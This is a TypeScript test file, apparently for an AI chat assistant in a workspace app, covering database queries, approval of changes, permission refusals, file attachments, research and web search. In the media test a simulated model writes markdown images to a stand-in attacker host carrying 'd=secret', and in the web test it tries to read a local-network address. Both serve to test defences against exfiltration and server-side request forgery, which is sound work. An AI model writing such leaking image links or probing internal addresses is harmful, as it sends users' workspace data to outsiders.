  check(/ {2}- Fitting \(status; options by group: todo: [^;]+; in_progress: [^;]+; done: /.test(mapOf(fake.chats[0])), "…a status with its options by group (to do, in progress, done)", mapOf(fake.chats[0]));
  check(
    rowHit.done && rowSource?.text.startsWith(`A row of the database "Spare parts" (database_id ${parts.id}).\nStock: Ordered`) === true,
    "a database row found by search comes with its database (to query it) and its values",
    rowSource,
  );
  fake.setChat(researcher({ readId: parts.id }));
  fake.chats.length = 0;
  const ordered = await ask(alice, { workspaceId, message: "Which spare parts are ordered?" });
  const readOut = toolResults(fake.chats.at(-1)!).join("\n");
  check(
    ordered.done && readOut.includes("Its 1 rows:") && readOut.includes("Winter tyres") && readOut.includes("Stock: Ordered"),
    "reading a database lists its rows with their values",
    readOut.slice(0, 500),
  );
  check(readOut.includes(`database_id ${parts.id}`) && readOut.includes("- Stock (select; options: Ordered, In stock)"), "…and its properties with their types and options, to filter on", readOut.slice(0, 500));

  // ── Querying a database ─────────────────────────────────────────────────────────────────────
  const brakes = await createPage(actor, { workspaceId, parentId: parts.id, title: "Brake pads", properties: { [stock.id]: stock.options.options![1].id } });
  const query = (database_id: string, extra: Record<string, unknown> = {}) => ({ name: "query_database", arguments: { database_id, ...extra } });
  fake.setChat(caller([query(parts.id, { filters: [{ property: "Stock", op: "equals", value: "Ordered" }] })]));
  fake.chats.length = 0;
  const queried = await ask(alice, { workspaceId, message: "Which spare parts are still on order?" });
  const queryOut = toolResults(fake.chats.at(-1)!).join("\n");
  check(
    queried.done && queryOut.startsWith('1 rows of the database "Spare parts" match') && queryOut.includes("Winter tyres") && !queryOut.includes("Brake pads"),
    "query_database lists the rows that match the filters",
    queryOut.slice(0, 400),
  );
  check(
    queried.sources.some((s) => s.pageId === winter.id && s.kind === "page") && !queried.sources.some((s) => s.pageId === brakes.id),
    "…each a source the answer can cite",
    queried.sources,
  );
  check(queried.steps.includes("query:Spare parts:Stock equals Ordered:1"), "…shown as a step with its filters and how many rows matched", queried.steps);
  const either = [
    { property: "Stock", op: "equals", value: "Ordered" },
    { property: "Stock", op: "equals", value: "In stock" },
  ];
  fake.setChat(caller([query(parts.id, { filters: either, filter_combinator: "or", sorts: [{ property: "title", direction: "desc" }], limit: 1 })]));
  fake.chats.length = 0;
  const sorted = await ask(alice, { workspaceId, message: "Last spare part by name?" });
  const sortedOut = toolResults(fake.chats.at(-1)!).join("\n");
  check(sortedOut.startsWith('2 rows of the database "Spare parts" match; the first 1 are below') && sortedOut.includes("Winter tyres"), "…combined with or, sorted and limited as asked", sortedOut.slice(0, 300));
  const sortedStep = sorted.events.flatMap((e) => (e.type === "step" && e.step.kind === "query" ? [e.step] : []))[0];
  check(sortedStep?.any === true && sortedStep.conditions.length === 2, "…and its step says any of the rules may match", sortedStep);
  fake.setChat(caller([query(parts.id, { filters: [{ property: "Colour", op: "equals", value: "Red" }] })]));
  fake.chats.length = 0;
  const badQuery = await ask(alice, { workspaceId, message: "Red parts?" });
  check(badQuery.done && toolResults(fake.chats.at(-1)!).some((r) => r.startsWith("The query is not valid") && r.includes("Colour")), "a query on a property the database hasn't is refused, saying why");
  fake.setChat(caller([query(parts.id, { filters: [{ property: "Stock", op: "sometimes", value: "x" }] })]));
  fake.chats.length = 0;
  await ask(alice, { workspaceId, message: "Parts?" });
  check(toolResults(fake.chats.at(-1)!).some((r) => r.startsWith("The query is not valid")), "…as is an op that doesn't exist");
  const ledger = await createPage(actor, { workspaceId, teamspaceId: null, kind: "database", title: "Owner ledger" });
  await createPage(actor, { workspaceId, parentId: ledger.id, title: "SECRET-LEDGER entry" });
  for (const [label, target, input] of [
    ["a database they can't open", ledger.id, { workspaceId, message: "Ledger entries?" }],
    ["a database outside the scope", parts.id, { workspaceId, message: "Parts?", scope: { pageId: fleet.id } }],
    ["a page that isn't a database", fleet.id, { workspaceId, message: "Fleet?" }],
    ["another workspace's page", theirs.id, { workspaceId, message: "Theirs?" }],
  ] as const) {
    fake.setChat(caller([query(target)]));
    fake.chats.length = 0;
    const run = await ask(alice, input);
    check(
      run.done && toolResults(fake.chats.at(-1)!).some((r) => r.startsWith("No database with that id can be queried")) && !run.steps.some((st) => st.startsWith("query:")),
      `query_database refuses ${label}`,
      { steps: run.steps, results: toolResults(fake.chats.at(-1)!) },
    );
    check(fake.chats.every((r) => !everything(r).includes("SECRET-LEDGER")), "…and nothing of it reaches the model");
  }
  const kept = await getConversation(alice, workspaceId, queried.conversationId!);
  check(
    kept.messages[1].steps?.some((st) => st.kind === "query" && st.database?.pageId === parts.id && st.database.kind === "database" && st.conditions[0]?.value === "Ordered" && st.any === undefined && st.results === 1),
    "a query step is kept with the conversation (its database shown as one)",
    kept.messages[1].steps,
  );
  setAiEnv(AI);

  // ── Changes ─────────────────────────────────────────────────────────────────────────────────
  const write = (name: string, args: Record<string, unknown>) => ({ name, arguments: args });
  const rowsOf = async (databaseId: string, title: string) =>
    db.select().from(page).where(and(eq(page.parentId, databaseId), eq(page.title, title)));
  const approvals = (run: { events: ChatEvent[] }) => run.events.flatMap((e) => (e.type === "approval" ? [e] : []));

  fake.setChat(caller([write("create_row", { database_id: parts.id, title: "Spark plugs", properties: { Stock: "Ordered" } })]));
  fake.chats.length = 0;
  const auto = await ask(alice, { workspaceId, message: "Add spark plugs, ordered", mode: "auto" });
  const [plugs] = await rowsOf(parts.id, "Spark plugs");
  check(auto.done && plugs?.createdBy === alice && plugs.properties[stock.id] === stock.options.options![0].id, "in auto mode the chat adds a row as the person, with its values", { auto, plugs });
  check(approvals(auto).length === 0 && auto.steps.includes("write:createRow:done:Spark plugs"), "…without asking, shown as a step linking the row", auto.steps);
  check(auto.sources.some((s) => s.pageId === plugs.id) && toolResults(fake.chats.at(-1)!).some((r) => r.startsWith("Added the row")), "…which the answer can cite", auto.sources);

  // Ask (the default): the answer waits for the person.
  fake.setChat(caller([write("create_row", { database_id: parts.id, title: "Wiper blades", properties: { Stock: "In stock" }, content: "Front and back." })]));
  fake.chats.length = 0;
  let asked: Extract<ChatEvent, { type: "approval" }> | null = null;
  let writtenBeforeApproval = true;
  let othersDecide = true;
  const approved = await ask(alice, { workspaceId, message: "Add wiper blades" }, {
    onEvent: async (e) => {
      if (e.type !== "approval") return;
      asked = e;
      writtenBeforeApproval = (await rowsOf(parts.id, "Wiper blades")).length > 0;
      othersDecide = decideChange(carol, e.id, "approve");
      check(decideChange(alice, e.id, "approve"), "the person approves the change");
    },
  });
  const askedAction = (asked as Extract<ChatEvent, { type: "approval" }> | null)?.action;
  check(
    askedAction?.action === "createRow" && askedAction.target?.pageId === parts.id && askedAction.title === "Wiper blades" && askedAction.changes[0]?.property === "Stock" && askedAction.changes[0].value === "In stock" && askedAction.content === "Front and back.",
    "in ask mode the chat asks first, saying what it would add, where, with which values and text",
    askedAction,
  );
  check(!writtenBeforeApproval, "…nothing is written before the person approves");
  check(!othersDecide, "…and nobody else can approve it");
  check(approved.done && (await rowsOf(parts.id, "Wiper blades")).length === 1 && approved.steps.includes("write:createRow:done:Wiper blades"), "once approved, the row is added", approved.steps);
  check(!decideChange(alice, (asked as unknown as { id: string }).id, "approve"), "…and the approval can't be used again");

  fake.setChat(caller([write("create_row", { database_id: parts.id, title: "Roof box" })]));
  fake.chats.length = 0;
  const declined = await ask(alice, { workspaceId, message: "Add a roof box" }, { onEvent: (e) => void (e.type === "approval" && decideChange(alice, e.id, "decline")) });
  check(declined.done && (await rowsOf(parts.id, "Roof box")).length === 0 && declined.steps.includes("write:createRow:declined:Roof box"), "a declined change isn't made, and says so as a step", declined.steps);
  check(toolResults(fake.chats.at(-1)!).some((r) => r.startsWith("The person declined this change")), "…and the model is told not to try it again");

  fake.setChat(
    caller([
      write("create_row", { database_id: parts.id, title: "Snow chains", properties: { Stock: "Ordered" } }),
      write("update_row", { row_id: plugs.id, properties: { Stock: "In stock" } }),
    ]),
  );
  fake.chats.length = 0;
  const always = await ask(alice, { workspaceId, message: "Add snow chains and mark the plugs in stock" }, { onEvent: (e) => void (e.type === "approval" && decideChange(alice, e.id, "always")) });
  const [plugsAfter] = await db.select().from(page).where(eq(page.id, plugs.id));
  check(
    always.done && approvals(always).length === 1 && (await rowsOf(parts.id, "Snow chains")).length === 1 && plugsAfter.properties[stock.id] === stock.options.options![1].id,
    "\"yes, don't ask again\" makes the rest of the answer's changes without asking",
    always.steps,
  );
  check(always.steps.includes("write:updateRow:done:Spark plugs"), "…a changed row shown as a step too", always.steps);
  const keptChanges = await getConversation(alice, workspaceId, always.conversationId!);
  const keptUpdate = keptChanges.messages[1].steps?.find((st) => st.kind === "write" && st.action === "updateRow");
  check(
    keptUpdate?.kind === "write" && keptUpdate.page?.pageId === plugs.id && keptUpdate.changes[0]?.value === "In stock",
    "changes are kept with the conversation, with the values set",
    keptUpdate,
  );
  fake.setChat(researcher({}));
  fake.chats.length = 0;
  await ask(alice, { workspaceId, conversationId: always.conversationId, message: "And what did you change?", mode: "read" });
  check(everything(fake.chats[0]).includes(`(Changes made: added the row "Snow chains" (page_id `) && everything(fake.chats[0]).includes(`changed the row (page_id ${plugs.id}): Stock`), "a later question knows what was changed, with the ids", everything(fake.chats[0]).slice(-800));
  check(
    fake.chats.every((r) => r.tools?.map((t) => t.function.name).join() === "search_pages,read_page,query_database,list_comments,page_history,page_version,remember,forget") && textOf(fake.chats[0].messages[0].content).includes("You can't change pages or databases"),
    "in read-only mode the model isn't offered changes (keeping notes about the person changes nothing in the workspace)",
  );
  // With the memory off, by the person or for the workspace, neither mode offers the notes' tools.
  const toolsOf = (r: (typeof fake.chats)[number]) => r.tools?.map((t) => t.function.name).join();
  for (const [off, on, who] of [
    [() => setMemoryUse(alice, workspaceId, false), () => setMemoryUse(alice, workspaceId, true), "the person"],
    [() => updateWorkspaceSettings(owner, workspaceId, { aiMemory: false }), () => updateWorkspaceSettings(owner, workspaceId, { aiMemory: true }), "the workspace's owners"],
  ] as const) {
    await off();
    fake.chats.length = 0;
    await ask(alice, { workspaceId, message: "Which tyres?", mode: "read" });
    const reading = fake.chats.splice(0);
    await ask(alice, { workspaceId, message: "Which tyres?" });
    check(
      reading.length > 0 &&
        reading.every((r) => toolsOf(r) === "search_pages,read_page,query_database,list_comments,page_history,page_version") &&
        fake.chats.length > 0 &&
        fake.chats.every((r) => toolsOf(r) === "search_pages,read_page,query_database,list_comments,page_history,page_version,create_row,update_row,create_page,edit_page,create_pdf,add_comment,create_database,create_form"),
      `with the memory turned off by ${who}, remember and forget aren't offered, in either mode`,
      [...reading, ...fake.chats].map(toolsOf),
    );
    await on();
  }
  fake.setChat(caller([write("create_row", { database_id: parts.id, title: "Sneaky row" })]));
  fake.chats.length = 0;
  const sneaky = await ask(alice, { workspaceId, message: "Add a row", mode: "read" });
  check(sneaky.done && (await rowsOf(parts.id, "Sneaky row")).length === 0 && toolResults(fake.chats.at(-1)!).some((r) => r.startsWith("Changes are off")), "…and one it makes anyway is refused");

  fake.setChat(caller([write("create_page", { parent_id: fleet.id, title: "Winter checklist", content: "- Fit the tyres" })]));
  fake.chats.length = 0;
  const pageMade = await ask(alice, { workspaceId, message: "Make a winter checklist under fleet notes", mode: "auto" });
  const [checklist] = await db.select().from(page).where(and(eq(page.parentId, fleet.id), eq(page.title, "Winter checklist")));
  check(pageMade.done && checklist?.createdBy === alice && pageMade.steps.includes("write:createPage:done:Winter checklist"), "the chat adds a page under a page", pageMade.steps);

  // A row's values: the person sees each value next to the one it replaces.
  fake.setChat(caller([write("update_row", { row_id: plugs.id, title: "Spark plugs (4)", properties: { Stock: "Ordered" } })]));
  let rowAsked: Extract<ChatEvent, { type: "approval" }>["action"] | null = null;
  await ask(alice, { workspaceId, message: "Mark the plugs ordered" }, {
    onEvent: (e) => {
      if (e.type !== "approval") return;
      rowAsked = e.action;
      decideChange(alice, e.id, "decline");
    },
  });
  const rowAction = rowAsked as Extract<ChatEvent, { type: "approval" }>["action"] | null;
  check(
    rowAction?.changes[0]?.before === "In stock" && rowAction.changes[0].value === "Ordered" && rowAction.previousTitle === "Spark plugs" && rowAction.title === "Spark plugs (4)",
    "a row change shows each value and the title as they are and as they would be",
    rowAction,
  );

  // A page's text, block by block, read with its block ids first.
  const blockList = await service.blockMarkdown(checklist.id);
  check(blockList.length === 1 && blockList[0].markdown === "* Fit the tyres", "a page's blocks are blockList with their ids and Markdown", blockList);
  fake.setChat(
    caller([
      write("read_page", { page_id: checklist.id, with_block_ids: true }),
      write("edit_page", {
        page_id: checklist.id,
        edits: [
          { op: "replace", block_id: blockList[0].id, markdown: `<!-- block ${blockList[0].id} -->\n- Fit the winter tyres` },
          { op: "append", markdown: "- Check the battery" },
        ],
      }),
    ]),
  );
  fake.chats.length = 0;
  let editAsked: Extract<ChatEvent, { type: "approval" }>["action"] | null = null;
  let editedBeforeApproval = true;
  const edited = await ask(alice, { workspaceId, message: "Say winter tyres, and add the battery" }, {
    onEvent: async (e) => {
      if (e.type !== "approval") return;
      editAsked = e.action;
      editedBeforeApproval = (await service.readPage(checklist.id)).markdown.includes("battery");
      decideChange(alice, e.id, "approve");
    },
  });
  check(toolResults(fake.chats[1]).some((r) => r.includes(`<!-- block ${blockList[0].id} -->`)), "read_page shows the block ids when asked", toolResults(fake.chats[1]));
  const editAction = editAsked as Extract<ChatEvent, { type: "approval" }>["action"] | null;
  check(
    editAction?.action === "editPage" &&
      editAction.target?.pageId === checklist.id &&
      editAction.diff?.map((c) => c.op).join() === "changed,added" &&
      editAction.diff.every((c) => c.block.key === ""),
    "an edit of a page's text asks first, showing the blocks it changes",
    editAction,
  );
  check(!editedBeforeApproval, "…nothing is written before the person approves");
  const editedBody = (await service.readPage(checklist.id)).markdown;
  check(
    edited.done && editedBody === "* Fit the winter tyres\n* Check the battery" && edited.steps.includes("write:editPage:done:Winter checklist"),
    "once approved, the blocks change (block lines copied back aren't written), shown as a step",
    { editedBody, steps: edited.steps },
  );
  const review = await getPageReview(alice, checklist.id);
  check(review?.ids.filter(Boolean).length === 2 && review.actors[0]?.name === alice, "…and the page offers the changes for review", review);
  const reverted = await decidePageReview({ userId: alice }, checklist.id, review.version, null, "undo");
  check(!reverted.stale && reverted.review === null && (await service.readPage(checklist.id)).markdown === "* Fit the tyres", "undoing all of them brings the text back", reverted);

  fake.setChat(caller([write("edit_page", { page_id: checklist.id, edits: [{ op: "delete", block_id: "no-such-block" }] })]));
  fake.chats.length = 0;
  const missingBlock = await ask(alice, { workspaceId, message: "Delete that", mode: "auto" });
  check(
    missingBlock.done && toolResults(fake.chats.at(-1)!).some((r) => r.startsWith("The change is not valid: the page has no block no-such-block")),
    "an edit naming a block the page doesn't have is refused, nothing written",
    toolResults(fake.chats.at(-1)!),
  );

  // Media the model writes that would load another site become links; the page's own stay.
  await service.replaceContent(checklist.id, "![Logo](https://cdn.example/logo.png)\n\n- Fit the tyres", { userId: alice });
  fake.setChat(
    caller([
      write("edit_page", {
        page_id: checklist.id,
        edits: [{ op: "append", markdown: "![Leak](https://evil.example/p.png?d=secret)\n\n[Evil](https://evil.example/) <!-- leafdesk:bookmark -->\n\n![Logo again](https://cdn.example/logo.png)" }],
      }),
    ]),
  );
  const mediaWrite = await ask(alice, { workspaceId, message: "Add the chart", mode: "auto" });
  const mediaBlocks = (await service.readBlocks(checklist.id)).blocks as { type: string; props?: { url?: string } }[];
  const mediaBody = (await service.readPage(checklist.id)).markdown;
  check(
    mediaWrite.done &&
      mediaBlocks.filter((b) => b.type === "image").map((b) => b.props?.url).join() === "https://cdn.example/logo.png,https://cdn.example/logo.png" &&
      !mediaBlocks.some((b) => b.type === "bookmark") &&
      mediaBody.includes("[Leak](https://evil.example/p.png?d=secret)") &&
      mediaBody.includes("[Evil](https://evil.example/)"),
    "an image or bookmark of another site the chat writes becomes a link; one the page already showed stays",
    { types: mediaBlocks.map((b) => b.type), mediaBody },
  );

  // What the person may not change.
  const sealed = await createPage(actor, { workspaceId, teamspaceId: null, kind: "database", title: "Sealed register" });
  await setPagePermission(owner, sealed.id, alice, "view");
  const sealedPage = await createPage(actor, { workspaceId, teamspaceId: null, title: "Sealed notes" });
  await setPagePermission(owner, sealedPage.id, alice, "view");
  for (const [label, call, input, refusalText] of [
    ["a database they may only read", write("create_row", { database_id: sealed.id, title: "Mine now" }), { workspaceId, message: "Add" }, "The person may only read this"],
    ["a page they may only read", write("create_page", { parent_id: sealedPage.id, title: "Mine now" }), { workspaceId, message: "Add" }, "The person may only read this"],
    ["a database they can't open", write("create_row", { database_id: ledger.id, title: "Mine now" }), { workspaceId, message: "Add" }, "No database with that id can be changed"],
    ["another workspace's page", write("create_page", { parent_id: theirs.id, title: "Mine now" }), { workspaceId, message: "Add" }, "No page with that id can be changed"],
    ["a database outside the scope", write("create_row", { database_id: parts.id, title: "Mine now" }), { workspaceId, message: "Add", scope: { pageId: fleet.id } }, "No database with that id can be changed"],
    ["a top-level page in a page's scope", write("create_page", { title: "Mine now" }), { workspaceId, message: "Add", scope: { pageId: fleet.id } }, "The change is not valid"],
    ["a database outside the teamspace in scope", write("create_row", { database_id: parts.id, title: "Mine now" }), { workspaceId, message: "Add", scope: { teamspaceId: workshop.id } }, "No database with that id can be changed"],
    ["a page outside the teamspace in scope", write("create_page", { parent_id: fleet.id, title: "Mine now" }), { workspaceId, message: "Add", scope: { teamspaceId: workshop.id } }, "No page with that id can be changed"],
    ["a row that isn't a database row", write("update_row", { row_id: fleet.id, title: "Mine now" }), { workspaceId, message: "Rename" }, "No database row with that id can be changed"],
    ["a value the database doesn't take", write("create_row", { database_id: parts.id, title: "Mine now", properties: { Colour: "Red" } }), { workspaceId, message: "Add" }, "The change is not valid"],
  ] as const) {
    fake.setChat(caller([call]));
    fake.chats.length = 0;
    const run = await ask(alice, input as ChatInput);
    const made = await db.select({ id: page.id }).from(page).where(and(eq(page.workspaceId, workspaceId), eq(page.title, "Mine now")));
    check(
      run.done && approvals(run).length === 0 && made.length === 0 && toolResults(fake.chats.at(-1)!).some((r) => r.startsWith(refusalText)) && !run.steps.some((st) => st.startsWith("write:")),
      `the chat refuses to change ${label}, before asking`,
      { steps: run.steps, results: toolResults(fake.chats.at(-1)!) },
    );
  }

  // Stopping while a change waits: nothing is written.
  fake.setChat(caller([write("create_row", { database_id: parts.id, title: "Never added" })]));
  const stopWaiting = new AbortController();
  const stoppedRun = await ask(alice, { workspaceId, message: "Add a row" }, { signal: stopWaiting.signal, onEvent: (e) => void (e.type === "approval" && stopWaiting.abort()) });
  check(stoppedRun.error === "aborted" && (await rowsOf(parts.id, "Never added")).length === 0, "stopping an answer while a change waits writes nothing", stoppedRun.events.map((e) => e.type));
  const stoppedKept = stoppedRun.conversationId ? await db.select().from(aiConversation).where(eq(aiConversation.id, stoppedRun.conversationId)) : [];
  check(stoppedKept.length === 0, "…and keeps no empty conversation");

  // ── Asking again ────────────────────────────────────────────────────────────────────────────
  fake.setChat(() => ({ text: "First answer." }));
  const firstTurn = await ask(alice, { workspaceId, message: "Which tyres fit?" });
  fake.setChat(() => ({ text: "Second answer." }));
  const secondTurn = await ask(alice, { workspaceId, conversationId: firstTurn.conversationId, message: "And the price?" });
  const againId = secondTurn.conversationId!;
  fake.setChat(() => ({ text: "Second answer, again." }));
  fake.chats.length = 0;
  const retried = await ask(alice, { workspaceId, conversationId: againId, message: "And the price, in euros?", replaceLast: true });
  const afterRetry = await getConversation(alice, workspaceId, againId);
  check(
    retried.done && afterRetry.messages.map((m) => m.content).join("|") === "Which tyres fit?|First answer.|And the price, in euros?|Second answer, again.",
    "asking again (or an edited question) replaces the last question and answer",
    afterRetry.messages.map((m) => m.content),
  );
  check(everything(fake.chats[0]).includes("First answer.") && !everything(fake.chats[0]).includes("Second answer."), "…the model sees the turns before it, not the one replaced");
  check(afterRetry.messages.every((m) => typeof m.at === "string" && !Number.isNaN(Date.parse(m.at))), "messages say when they were written", afterRetry.messages.map((m) => m.at));
  fake.setChat(() => {
    throw new Error("model down");
  });
  const failedAgain = await ask(alice, { workspaceId, conversationId: againId, message: "Price?", replaceLast: true });
  const afterFailure = await getConversation(alice, workspaceId, againId);
  check(failedAgain.error !== null && afterFailure.messages.at(-1)?.content === "Second answer, again." && afterFailure.messages.length === 4, "asking again that fails leaves the last answer as it was", afterFailure.messages.map((m) => m.content));
  setAiEnv(AI);
  check(
    (await refusal(() => startChat(alice, { workspaceId, conversationId: auto.conversationId, message: "Again", replaceLast: true }))) === "invalid",
    "an answer that changed things can't be asked again (it would change them twice)",
  );
  check((await refusal(() => startChat(alice, { workspaceId, message: "Again", replaceLast: true }))) === "invalid", "…nor can a conversation that hasn't started");

  // ── Models, files, research and the web ─────────────────────────────────────────────────────
  {
    const { memoryAiUsageLedger } = await import("@/server/ai/usage");
    const { chatFileForOwner, uploadChatFile } = await import("@/server/ai-chat-files");
    const { chatOptionsFor, saveReportAsPage } = await import("@/server/ai-chat");
    const { file } = await import("@/db/schema");
    const { Readable } = await import("node:stream");
    const { createServer } = await import("node:http");
    const upload = (userId: string, name: string, contentType: string, bytes: Buffer) =>
      uploadChatFile(userId, workspaceId, { name, contentType, body: Readable.from([bytes]), declaredSize: bytes.length });
    // A 1×1 PNG.
    const png = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==", "base64");
    const toolsOf = (r: FakeChatRequest) => (r.tools ?? []).map((t) => t.function.name);

    const ledger = memoryAiUsageLedger();
    const MODELS = { ...AI, AI_CHAT_MODELS: "fake-big, fake-chat, fake-vision" };
    setAiEnv(MODELS, { usage: ledger });
    const options = await chatOptionsFor(alice, workspaceId);
    check(options.models.map((m) => m.id).join() === "fake-chat,fake-big,fake-vision" && options.models.every((m) => !m.images), "the chat offers the main model and the others named, without images unless said", options);
    check(options.models.every((m) => m.name === m.id), "a model the catalog doesn't know is shown by its id", options.models);

    fake.setChat(() => ({ text: "Big answer." }));
    fake.chats.length = 0;
    const big = await ask(alice, { workspaceId, message: "Which model?", model: "fake-big" });
    const bigKept = await getConversation(alice, workspaceId, big.conversationId!);
    check(big.done && fake.chats.every((r) => r.model === "fake-big") && bigKept.model === "fake-big" && bigKept.messages.at(-1)?.model === "fake-big", "the model picked answers, and the conversation keeps it", { models: fake.chats.map((r) => r.model), model: bigKept.model });
    check(
      ledger.rows.some((r) => r.workspaceId === workspaceId && r.feature === "chat" && r.model === "fake-big" && r.requests >= 1) && ledger.people.some((p) => p.userId === alice && p.feature === "chat"),
      "…its usage counted by model, and by person",
      { rows: ledger.rows, people: ledger.people },
    );
    fake.chats.length = 0;
    await ask(alice, { workspaceId, conversationId: big.conversationId, message: "And now?" });
    check(fake.chats.every((r) => r.model === "fake-big"), "a later question in the conversation goes to its model", fake.chats.map((r) => r.model));
    fake.chats.length = 0;
    await ask(alice, { workspaceId, message: "A new one" });
    check(fake.chats.every((r) => r.model === "fake-big") && (await chatOptionsFor(alice, workspaceId)).defaultModel === "fake-big", "a new conversation starts with the person's latest model", fake.chats.map((r) => r.model));
    fake.chats.length = 0;
    await ask(alice, { workspaceId, message: "Unknown", model: "not-offered" });
    check(fake.chats.every((r) => r.model === "fake-chat"), "a model the chat doesn't offer falls back to the main one", fake.chats.map((r) => r.model));

    // Files: their text reaches the prompt; only their owner opens or attaches them.
    const notes = await upload(alice, "launch.md", "text/markdown", Buffer.from("The launch code word is PELICAN-7."));
    check(notes.url === `/api/ai/chat/files/${notes.id}` && (await chatFileForOwner(alice, notes.id)) !== null && (await chatFileForOwner(carol, notes.id)) === null, "an attached file opens for the person who attached it only");
    check((await refusal(() => startChat(carol, { workspaceId, message: "Read it", attachments: [notes.id] }))) === "noAccess", "…and nobody else can attach it to a question");
    fake.setChat(() => ({ text: "It says PELICAN-7." }));
    fake.chats.length = 0;
    const withFile = await ask(alice, { workspaceId, message: "What is the code word?", attachments: [notes.id] });
    const fileAsk = everything(fake.chats[0]);
    check(withFile.done && /<attachment name="launch\.md">\nThe launch code word is PELICAN-7\.\n<\/attachment>/.test(fileAsk) && toolsOf(fake.chats[0]).includes("read_attachment"), "a document's text goes to the model with the question, tagged as data", fileAsk.slice(0, 3000));
    const fileKept = await getConversation(alice, workspaceId, withFile.conversationId!);
    check(fileKept.messages[0].attachments?.[0]?.id === notes.id && fileKept.messages[0].attachments[0].url === notes.url, "the question keeps its file, shown as a chip that opens it", fileKept.messages[0]);
    check((await refusal(() => startChat(alice, { workspaceId, message: "Again elsewhere", attachments: [notes.id] }))) === "noAccess", "a file sent in one conversation can't be attached in another");
    fake.chats.length = 0;
    await ask(alice, { workspaceId, conversationId: withFile.conversationId, message: "Remind me of the code word" });
    check(everything(fake.chats[0]).includes("PELICAN-7"), "later questions in the conversation still see the file", everything(fake.chats[0]).slice(0, 2000));

    const image = await upload(alice, "shot.png", "image/png", png);
    check((await refusal(() => startChat(alice, { workspaceId, message: "What is this?", attachments: [image.id] }))) === "invalid", "an image isn't sent to a model that doesn't take images");
    setAiEnv({ ...MODELS, AI_IMAGE_INPUT: "true" }, { usage: ledger });
    fake.setChat(() => ({ text: "A dot." }));
    fake.chats.length = 0;
    const seen = await ask(alice, { workspaceId, message: "What is this?", attachments: [image.id] });
    check(seen.done && JSON.stringify(fake.chats[0].messages).includes(`data:image/png;base64,${png.toString("base64")}`), "…and goes as an image to one that does", JSON.stringify(fake.chats[0].messages).slice(0, 500));
    setAiEnv(MODELS, { usage: ledger });
    await deleteConversations(alice, workspaceId, [withFile.conversationId!, seen.conversationId!]);
    check((await db.select().from(file).where(inArray(file.id, [notes.id, image.id]))).length === 0, "a conversation's files are deleted with it");

    // Research: read-only tools, a plan, a report kept as a page.
    fake.setChat(caller([
      { name: "plan_research", arguments: { questions: ["Who sells tyres?", "What does the fleet need?"] } },
      { name: "search_pages", arguments: { query: "tyres" } },
    ]));
    fake.chats.length = 0;
    const research = await ask(alice, { workspaceId, message: "Research our tyre situation", research: true, mode: "auto" });
    const researchTools = toolsOf(fake.chats[0]);
    check(
      research.done && researchTools.includes("plan_research") && researchTools.includes("search_pages") && !researchTools.some((t) => ["create_row", "update_row", "create_page", "edit_page", "remember", "forget", "add_comment"].includes(t)),
      "research offers the plan and the reading tools only, whatever the mode",
      researchTools,
    );
    check(research.steps[0] === "plan:Who sells tyres?|What does the fleet need?" && research.steps.some((st) => st.startsWith("search:tyres:")), "…its plan and searches shown as steps", research.steps);
    check(ledger.rows.some((r) => r.feature === "chat.research" && r.workspaceId === workspaceId), "…counted as research in the usage", ledger.rows.map((r) => r.feature));
    const researchKept = await getConversation(alice, workspaceId, research.conversationId!);
    const reportIndex = researchKept.messages.length - 1;
    check(researchKept.messages[reportIndex].research === true && researchKept.messages[reportIndex - 1].research === true, "the question and its report are kept as research", researchKept.messages.map((m) => m.research));
    const labels = { sources: "Sources", untitled: "Report" };
    const saved = await saveReportAsPage(alice, workspaceId, research.conversationId!, reportIndex, labels);
    const [reportPage] = await db.select().from(page).where(eq(page.id, saved.pageId));
    check(reportPage?.createdBy === alice && reportPage.teamspaceId === null && reportPage.parentId === null && reportPage.workspaceId === workspaceId, "a report is saved as a private page of the person", reportPage);
    check((await refusal(() => saveReportAsPage(alice, workspaceId, big.conversationId!, 1, labels))) === "invalid", "…and only a report can be");

    // The web: off until the workspace's owners turn it on, then read-only and asked about.
    const pages = [
      { url: "https://tyres.example/prices", title: "Tyre prices 2026", content: "Winter tyres cost 90 euros." },
      { url: "https://tyres.example/brands", title: "Tyre brands", content: "Brands compared." },
    ];
    const searxng = createServer((req, res) => {
      const query = new URL(req.url ?? "/", "http://x").searchParams.get("q");
      res.writeHead(200, { "Content-Type": "application/json" }).end(JSON.stringify({ query, results: pages }));
    });
    await new Promise<void>((resolve) => searxng.listen(0, "127.0.0.1", resolve));
    const searchUrl = `http://127.0.0.1:${(searxng.address() as { port: number }).port}`;
    process.env.WEB_SEARCH_URL = searchUrl;
    try {
      fake.setChat(() => ({ text: "Off." }));
      fake.chats.length = 0;
      await ask(alice, { workspaceId, message: "Tyre prices online?" });
      check(!toolsOf(fake.chats[0]).includes("search_web"), "the chat has no web tools until the workspace turns web search on");
      await updateWorkspaceSettings(owner, workspaceId, { aiWebSearch: true });
      check((await chatOptionsFor(alice, workspaceId)).webSearch, "…which the box is told");
      // Searches, tries a page on the server's own network, then cites the brands page by its number.
      fake.setChat((request) => {
        const made = request.messages.filter((m) => m.role === "assistant" && m.tool_calls?.length).length;
        if (made === 0) return { toolCalls: [{ name: "search_web", arguments: { query: "winter tyre prices" } }] };
        if (made === 1) return { toolCalls: [{ name: "read_web_page", arguments: { url: `${searchUrl}/secret` } }] };
        const n = /<source n="(\d+)" url="https:\/\/tyres\.example\/brands"/.exec(everything(request))?.[1];
        return { text: `Brands compared [${n}].` };
      });
      fake.chats.length = 0;
      // What a web call carries leaves the workspace: each is asked about, with the words or the address.
      const approveWeb = (e: ChatEvent) => void (e.type === "approval" && decideChange(alice, e.id, e.action.action === "readWeb" || e.action.action === "searchWeb" ? "approve" : "decline"));
      const web = await ask(alice, { workspaceId, message: "What do winter tyres cost?" }, { onEvent: approveWeb });
      check(
        approvals(web).map((a) => `${a.action.action}:${a.action.title}`).join() === `searchWeb:winter tyre prices,readWeb:${searchUrl}/secret`,
        "each web search and page read is asked about first, showing the words or the address",
        approvals(web).map((a) => a.action),
      );
      const results = toolResults(fake.chats.at(-1)!);
      check(toolsOf(fake.chats[0]).includes("search_web") && toolsOf(fake.chats[0]).includes("read_web_page"), "with it on, the chat may search the web and read pages", toolsOf(fake.chats[0]));
      check(web.steps[0] === "web-search:winter tyre prices:2" && results[0]?.includes('url="https://tyres.example/prices"') && results[0].includes("Winter tyres cost 90 euros."), "web results come back as numbered sources, from the search service", { steps: web.steps, results });
